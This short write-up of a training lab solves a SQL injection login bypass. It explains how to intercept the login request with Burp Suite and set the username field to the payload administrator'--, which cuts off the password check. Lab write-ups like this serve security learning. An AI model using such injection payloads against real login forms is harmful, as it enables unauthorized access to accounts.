Lab: SQL injection vulnerability allowing login bypass
APPRENTICE

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.
<pre>
<b> Solution</b>

  GET /my-account?id=administrator HTTP/2
  
Use Burp Suite to intercept and modify the login request.
Modify the username parameter, giving it the value: administrator'--
</pre>

  ![Lab2](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/9c9c89b9-ba58-4309-8180-79006f021401)
